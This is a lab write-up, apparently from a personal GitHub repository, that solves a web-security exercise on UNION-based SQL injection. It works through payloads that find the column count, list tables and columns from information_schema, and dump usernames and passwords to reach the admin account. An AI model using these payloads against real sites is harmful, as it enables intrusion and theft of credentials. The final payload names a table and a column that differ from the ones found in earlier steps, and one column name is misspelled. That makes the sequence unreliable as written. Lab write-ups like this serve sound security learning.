# SQL injection attack, listing the database contents on non-Oracle databases

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/44f1dca9-06a5-42f6-839d-2753727aa73c)

## Solution

First we use the payload `'+UNION+SELECT+'abc','def'--` to identify that the resultset has two columns and both return string.
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/8dcd2e77-970f-470d-ab75-796ec80a144f)

Next by modify the category using the payload `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--` to get all tables from the database.
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/775d35be-de0a-4245-adbc-e4477dc5c1bc)

By using `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_toydpv'--` we get the values inside the `users_toydpv` table and find the name of columns inside it `username_vzotbi` and `passowrd_wncrqd` .
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/fe89d2a9-0b47-46e6-be1a-4ddfbba36239)

The tables names retrieved above are then used in the payload`'+UNION+SELECT+username_vztobi,+password_wncrqd+FROM+users_abcdef--` to list the username and password. Here we find out the admin login username and password.
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/1c2beb84-a595-4edb-8b78-880a49a0896c)

The login information retrieved above is then used to successfully access the admin account.
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/4db8861c-3582-4c0a-b827-deaf90a37e9a)
